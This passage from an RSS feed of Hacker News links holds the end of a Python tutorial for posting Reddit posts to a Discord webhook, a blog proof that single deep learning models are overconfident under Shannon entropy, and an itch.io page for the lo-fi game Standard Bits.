<span>elif</span> <span>post</span><span>[</span><span>'data'</span><span>][</span><span>'is_video'</span><span>]:</span> <span># video post
</span>    <span>embed</span> <span>=</span> <span>DiscordEmbed</span><span>(</span><span>title</span><span>=</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'title'</span><span>],</span> <span>url</span><span>=</span><span>permalink</span><span>)</span>
    <span>embed</span><span>.</span><span>set_image</span><span>(</span><span>url</span><span>=</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'thumbnail'</span><span>])</span>
    <span>embed</span><span>.</span><span>set_footer</span><span>(</span><span>text</span><span>=</span><span>f"Video posted by </span><span>{</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'author'</span><span>]</span><span>}</span><span>"</span><span>)</span>

<span>else</span><span>:</span> <span># image post
</span>    <span>embed</span> <span>=</span> <span>DiscordEmbed</span><span>(</span><span>title</span><span>=</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'title'</span><span>],</span> <span>url</span><span>=</span><span>permalink</span><span>)</span>
    <span>embed</span><span>.</span><span>set_image</span><span>(</span><span>url</span><span>=</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'url'</span><span>])</span>
    <span>embed</span><span>.</span><span>set_footer</span><span>(</span><span>text</span><span>=</span><span>f"Image posted by </span><span>{</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'author'</span><span>]</span><span>}</span><span>"</span><span>)</span>
</code></pre></div></div> <p>Once the above code has executed, we have a webhook object, and an embed object. To add the newly created embed in to the webhook request and execute it, we simply do:</p> <div><div><pre><code><span>webhook</span><span>.</span><span>add_embed</span><span>(</span><span>embed</span><span>)</span>
<span>webhook</span><span>.</span><span>execute</span><span>()</span>
</code></pre></div></div> <p>Which is pretty self-explanatory. We could capture the output of <code>webhook.execute()</code> to check whether things went ok. One problem we typically encounter is being rate limited if we use the webhook in quick succession. A simple workaround for this is to <code>import time</code> at the top of the file, and then add a <code>time.sleep(1)</code> after the execution above, to pause for a second after each webhook post.</p> <h2 id="fin"> <a href="#fin"></a> Fin </h2> <p><img src="https://danwalker.com/python-discord-reddit-feed/discord-feed.png" alt="Discord feed"></p> <p>Run the script on a cronjob, and voila!</p> <p>I keep a single small Digital Ocean VPS which hosts all my Discord bots and scrapers. An example cronjob to execute every 5 minutes might for this script could look like:</p> <div><div><pre><code><span>*</span>/5 <span>*</span> <span>*</span> <span>*</span> <span>*</span> /usr/bin/python /root/scripts/reddit2discord.py <span>&gt;&gt;</span> /dev/null 2&gt;&amp;1
</code></pre></div></div> <p>Some ideas to extend this script further could include filtering out certain posts, highlighting posts from certain authors, or using arguments with <code>argparse</code> to make the script more flexible.</p> <p>You can also combine subreddits in the URL to pull from multiple subreddits, for example: <code>https://www.reddit.com/r/discordapp+python/new/.json</code></p> <p>The full code can be found (and starred if you found it helpful) as a Gist <a href="https://gist.github.com/danwalkeruk/7b471a095c645f96456ec2dd3d4bc87f">here</a>.</p> <p>Enjoy your new #reddit-feed ✌️</p> </div> </article> <!--comments-->    <!--end comments--> </main>   </div></div>]]>
            </description>
            <link>https://danwalker.com/python-discord-reddit-feed/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937851</guid>
            <pubDate>Fri, 30 Oct 2020 00:37:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lessons learned from launch HN as an open source project]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24937661">thread link</a>) | @cheeseblubber
<br/>
October 29, 2020 | https://www.papercups.io/blog/launch | <a href="https://web.archive.org/web/*/https://www.papercups.io/blog/launch">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.papercups.io/blog/launch</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937661</guid>
            <pubDate>Fri, 30 Oct 2020 00:11:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deterministic Overconfidence]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24937648">thread link</a>) | @keyboardman
<br/>
October 29, 2020 | https://leimao.github.io/blog/Deterministic-Overconfidence/ | <a href="https://web.archive.org/web/*/https://leimao.github.io/blog/Deterministic-Overconfidence/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>Standard deep learning only learns a single model that could best represent the training data, rather than model ensembles which Bayesian learning learns. When it comes to prediction, given an input, the model could only predict one output value. Therefore, standard deep learning models for regression and classification do not capture model uncertainty. In classification, predictive probabilities obtained at the end of the pipeline, such as the softmax output, are often erroneously interpreted as model confidence.</p>



<p>Standard deep learning model only learns $y = f(x)$, whereas Bayesian model learns $p(\mathbf{y}|x)$, where $\mathbf{y}$ is an univariate or multivariate variable. Statistically, the predicted value $y$ from standard deep learning model is sampled from the distribution $p(\mathbf{y}|x)$ that Bayesian model predicts, i.e., $y \sim p(\mathbf{y}|x)$. In terms of regression, $y$ is usually a scalar value, we could evaluate the prediction uncertainty or confidence using metrics such as variance or standard deviation. In terms of classification, $y$ is usually an array that sums to $1.0$, we could evaluate the prediction uncertainty or confidence using metrics such as Shannon entropy. The Shannon entropy for standard deep learning classification model is $H(y)$, whereas the Shannon entropy for Bayesian classification model is usually computed using $H(\mathbb{E}(\mathbf{y}))$.</p>



<p>In this blog post, I would like to systematically discuss the deterministic overconfidence issues of uncertainty quantification in standard deep learning.</p>

<h3 id="prerequisites">Prerequisites</h3>

<h4 id="multivariate-jensens-inequality">Multivariate Jensen’s Inequality</h4>

<p>In my previous blog post on <a href="https://leimao.github.io/blog/Multivariate-Jensen-Inequality/">“Multivariate Jensen’s Inequality”</a>, we have proved Jensen’s inequality for the multivariate case.</p>



<p>If $\mathbf{X} \in \mathbb{R}^n$ is random multivariate variable and $f: \mathbb{R}^n \rightarrow \mathbb{R}$ is a convex function, then</p><p>

\[f(\mathbb{E}[\mathbf{X}]) \leq \mathbb{E}[f(\mathbf{X})]\]

</p><p>Similarly, if $f$ is a concave function, then</p><p>

\[f(\mathbb{E}[\mathbf{X}]) \geq \mathbb{E}[f(\mathbf{X})]\]

</p><h3 id="shannon-entropy">Shannon Entropy</h3>

<p>The discrete case of <a href="https://leimao.github.io/blog/Entropy-Perplexity/">Shannon entropy</a> is defined as follows.</p><p>

\[H(p) = - \sum_{i=1}^{n} p(x_i) \log_b p(x_i)\]

</p><p>where $n$ is the number of discrete states, $p(x_i)$ is the probability of the system being in the state $i$, and $\sum_{i=1}^{n} p(x_i) = 1$.</p>



<p>Shannon entropy could be used for measuring the uncertainty of a system, such as a machine learning classifier model.</p>



<p>For example, if a binary classifier predicts an input $x$ to be class $y^{+}$ and $y^{-}$ with a probability of $p = (0.999, 0.001)$. The Shannon entropy $H(p) \approx 0$, meaning that there is almost no uncertainty with the prediction and the system is almost 100% sure about the prediction. On the other hand, when $p = (0.500, 0.500)$, the Shannon entropy, if using $b = 2$, $H(p) = 1.0$ which is the largest entropy when using $b = 2$. This means that the uncertainty is the largest and the system is 100% unsure about the prediction.</p>



<p>Shannon entropy is strictly concave with respect to $p$. Here we would provide a quick proof.</p>



<p><em>Proof</em></p>



<p>We have defined the space of probabilities for $p$.</p><p>

\[P = \{(p_1, p_2, \cdots, p_n): 0 &lt; p_i &lt; 1, \sum_{i=1}^{n} p_i = 1 \}\]

</p><p>Given $p \in P$, and a real-numbered vector $q = (q_1, q_2, \cdots, q_n) \in \mathbb{R}^n$ such that $\sum_{i=1}^{n} q_i = 0$ and $q \neq \mathbf{0}$, there must exist a small range $\lambda \in [u, v]$ where $p + \lambda q \in P$. Then we have</p><p>

\[H(p + \lambda q) = - \sum_{i=1}^{n} (p_i + \lambda q_i) \log_b (p_i + \lambda q_i)\]

</p><p>The derivatives with respect to $\lambda$ are</p><p>

\[\begin{align}
\frac{d H}{d \lambda} &amp;= - \sum_{i=1}^{n} \Big [ q_i \log_b (p_i + \lambda q_i) + (p_i + \lambda q_i) \frac{1}{(p_i + \lambda q_i) \ln b} \Big] \\
&amp;= - \sum_{i=1}^{n} \Big [ q_i \log_b (p_i + \lambda q_i) + \frac{1}{\ln b} \Big] \\
&amp;= - \sum_{i=1}^{n} q_i \log_b (p_i + \lambda q_i) + \frac{n}{\ln b} \\
\end{align}\]

\[\begin{align}
\frac{d^2 H}{d \lambda^2} &amp;= - \sum_{i=1}^{n} \Big[ q_i  \frac{q_i}{(p_i + \lambda q_i) \ln b} \Big]\\
&amp;= - \frac{1}{\ln b} \sum_{i=1}^{n} \Big[ \frac{q_i^2}{(p_i + \lambda q_i)} \Big]\\
\end{align}\]

</p><p>Because $p + \lambda q \in P$, $0 &lt; p_i + \lambda q_i &lt; 1$ for any $i \in [1, n]$. Therefore,</p><p>

\[\begin{align}
\frac{d^2 H}{d \lambda^2} &lt; 0
\end{align}\]

</p><p>This concludes the proof that Shannon entropy is strictly concave with respect to $p$.</p>

<h3 id="deterministic-overconfidence">Deterministic Overconfidence</h3>

<p>Deterministic overconfidence states that for classification models, we have</p><p>

\[\mathbb{E}(H(\mathbf{y})) \leq H(\mathbb{E}(\mathbf{y}))\]

</p><p>In layman’s terms, this means that predicting a single output given an input using the standard deep learning model is very <strong>likely</strong> to have lower Shannon entropy compared to the expected value of Shannon entropy uncertainty from Bayesian model ensembles.</p>



<p>A concrete example is from the Shannon entropy computed from the probabilities using softmax function published in Yarin Gal’s paper <a href="https://arxiv.org/abs/1506.02142">“Dropout as a Bayesian Approximation: Representing Model Uncertainty in Deep Learning”</a>.</p>

<div>
<figure>
    <img src="https://leimao.github.io/images/blog/2020-10-11-Deterministic-Overconfidence/overconfidence.png">
    <figcaption>Binary Cross Entropy Deterministic Overconfidence</figcaption>
</figure>
</div>

<p>We are looking at the figure (b) in particular. If the input to the softmax function is the logits from the standard deep learning model, the output $y$ will be mostly likely the expected value $\mathbb{E}(\mathbf{y}) \approx 1.0$. Therefore, the Shannon entropy $H(y) \approx 0$ and $\mathbb{E}(H(\mathbf{y})) \approx 0.0$, meaning that the model is 100% sure most of the time about the predicted class even though the model has never seen the input $x$ and has to do extrapolation in order to predict. This suggest that apply the uncertainty quantification to the standard deep learning model is erroneous.</p>



<p>Let’s further take a look at what the Shannon entropy for the Bayesian model predictions. The Bayesian model predicts the distribution $\mathbf{y}$, and we could compute the expected value of the Shannon entropy $\mathbb{E}(H(\mathbf{y}))$. We could see from the figure that a lot of samples $y \sim p(\mathbf{y}|x)$ are away from $1.0$, therefore $\mathbb{E}(\mathbf{y})$ should be smaller than $1.0$, and $H(\mathbb{E}(\mathbf{y}))$ should be larger than $0$.</p>



<p>This analysis matches our statement of deterministic overconfidence that</p><p>

\[\mathbb{E}(H(\mathbf{y})) \leq H(\mathbb{E}(\mathbf{y}))\]

</p><h3 id="proof-to-deterministic-overconfidence">Proof to Deterministic Overconfidence</h3>

<p>The proof to deterministic overconfidence is extremely simple, given the prerequisites that have been shown early in the post.</p>



<p>Because Shannon entropy $H$ is strictly concave even for the multivariate case, we apply the multivariate Jensen’s inequality, we have</p><p>

\[\mathbb{E}(H(\mathbf{y})) \leq H(\mathbb{E}(\mathbf{y}))\]

</p><p>This concludes the proof.</p>

<h3 id="extensions">Extensions</h3>

<p>We have discussed the deterministic overconfidence for classification models. How about regression models. The short answer is that there is also deterministic overconfidence for regression models. If the uncertainty is measured using variance, without showing the proof formally, variance is also a concave function. By applying the multivariate Jensen’s inequality as we did for the Shannon entropy, we could also reach the same conclusion for regression models.</p>

<h3 id="caveats">Caveats</h3>

<p>The proof to deterministic overconfidence from the <a href="https://docs.aws.amazon.com/prescriptive-guidance/latest/ml-quantifying-uncertainty/app-a.html">AWS Prescriptive Guidance</a> is incorrect. In case AWS changes the web content, the PDF version of the doc could be found <a href="https://leimao.github.io/downloads/blog/2020-10-11-Deterministic-Overconfidence/quantifying-uncertainty-in-deep-learning-systems.pdf">here</a> in the Appendix A section.</p>



<p>There are two major issues in their argument and proof.</p>



<p>The deterministic overconfidence was not only restricted to using softmax but also other activation functions.</p>



<p>The major mistake they made is that the random variable $\mathbf{u}$ was defined between $[-\infty, +\infty]$, and it could not be separated into two regions and apply Jensen’s inequality separately.</p>

<h3 id="references">References</h3>

<ul>
  <li><a href="https://leimao.github.io/blog/Multivariate-Jensen-Inequality/">Multivariate Jensen’s Inequality</a></li>
  <li><a href="https://leimao.github.io/blog/Entropy-Perplexity/">Shannon Entropy</a></li>
  <li><a href="https://leimao.github.io/downloads/blog/2020-10-11-Deterministic-Overconfidence/chapShannon.pdf">Shannon Entropy’s Concavity</a></li>
  <li><a href="https://arxiv.org/abs/1506.02142">Dropout as a Bayesian Approximation: Representing Model Uncertainty in Deep Learning</a></li>
</ul>

      <hr>
      
    </div></div>]]>
            </description>
            <link>https://leimao.github.io/blog/Deterministic-Overconfidence/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937648</guid>
            <pubDate>Fri, 30 Oct 2020 00:09:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Standard Bits, an ultra lo-fi video game named after the Mac's graphics blitter]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24937606">thread link</a>) | @doomlaser
<br/>
October 29, 2020 | https://doomlaser.itch.io/standardbits#game | <a href="https://web.archive.org/web/*/https://doomlaser.itch.io/standardbits#game">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="view_game_page_51384"><p>A downloadable game for Windows and macOS</p><div><div><div><div><div><table><tbody><tr><td>Updated</td><td><abbr title="10 October 2020 @ 02:00"><span></span> 23 days ago</abbr></td></tr><tr><td>Status</td><td><a href="https://itch.io/games/released">Released</a></td></tr><tr><td>Platforms</td><td><a href="https://itch.io/games/platform-windows">Windows</a>, <a href="https://itch.io/games/platform-osx">macOS</a></td></tr><tr><td>Rating</td><td><div title="5.0" itemprop="aggregateRating" itemtype="http://schema.org/AggregateRating" itemscope=""><div content="5.0" itemprop="ratingValue"></div><p><span content="3" itemprop="ratingCount">(3)</span></p></div></td></tr><tr><td>Author</td><td><a href="https://doomlaser.itch.io/">Doomlaser</a></td></tr><tr><td>Genre</td><td><a href="https://itch.io/games/genre-adventure">Adventure</a></td></tr><tr><td>Tags</td><td><a href="https://itch.io/games/tag-abstract">Abstract</a>, <a href="https://itch.io/games/tag-artgame">artgame</a>, <a href="https://itch.io/games/tag-atmospheric">Atmospheric</a>, <a href="https://itch.io/games/tag-experimental">Experimental</a>, <a href="https://itch.io/games/tag-exploration">Exploration</a>, <a href="https://itch.io/games/tag-glitch">glitch</a>, <a href="https://itch.io/games/tag-minimalist">Minimalist</a>, <a href="https://itch.io/games/tag-psychedelic">psychedelic</a>, <a href="https://itch.io/games/tag-walking-simulator">Walking simulator</a>, <a href="https://itch.io/games/tag-weird">weird</a></td></tr><tr><td>Average session</td><td><a href="https://itch.io/games/duration-minutes">A few minutes</a></td></tr><tr><td>Inputs</td><td><a href="https://itch.io/games/input-keyboard">Keyboard</a>, <a href="https://itch.io/games/input-x360">Xbox controller</a>, <a href="https://itch.io/games/input-gamepad">Gamepad (any)</a>, <a href="https://itch.io/games/input-joystick">Joystick</a>, <a href="https://itch.io/games/input-wiimote">Wiimote</a>, <a href="https://itch.io/games/input-playstation">Playstation controller</a>, <a href="https://itch.io/games/input-joy-con">Joy-Con</a></td></tr><tr><td>Accessibility</td><td><a href="https://itch.io/games/accessibility-highcontrast">High-contrast</a>, <a href="https://itch.io/games/accessibility-textless">Textless</a></td></tr><tr><td>Links</td><td><a rel="nofollow noopener" href="http://doomlaser.com/trekking-across-the-northeast-for-gamma-256-and-blip/">Homepage</a></td></tr></tbody></table></div></div></div><div><h2 id="comments">Comments</h2><p><a href="https://itch.io/login?return_to=https%3A%2F%2Fdoomlaser.itch.io%2Fstandardbits" data-register_action="comment">Log in with itch.io</a> to leave a comment.</p><div id="community_topic_posts_widget_47274"><div><div data-post="{&quot;user_id&quot;:43197,&quot;id&quot;:424865}" id="post-424865"><div><a href="https://itch.io/profile/toster12d3"></a><div><div><p>Omg I saw this game on ExperimentalGameplayDotCom years ago!</p><p>It's one of my favorite hm.. objects from there. A pure exploration experience. Thank you for that!<br></p></div></div></div></div></div></div></div></div><div><div><p id="video_embed_widget_24588"><iframe frameborder="0" allowfullscreen="" src="//www.youtube.com/embed/4mkonvxtT9Y"></iframe></p></div><p><a href="https://img.itch.zone/aW1hZ2UvNTkyMDEvMjY2MjcyLmdpZg==/original/bgTKnU.gif" target="_blank" data-image_lightbox="true"><img src="https://img.itch.zone/aW1hZ2UvNTkyMDEvMjY2MjcyLmdpZg==/347x500/X9%2Bu4%2F.gif"></a></p></div></div></div></div>]]>
            </description>
            <link>https://doomlaser.itch.io/standardbits#game</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937606</guid>
            <pubDate>Fri, 30 Oct 2020 00:02:02 GMT</pubDate>
        </item>
    </channel>
</rss>
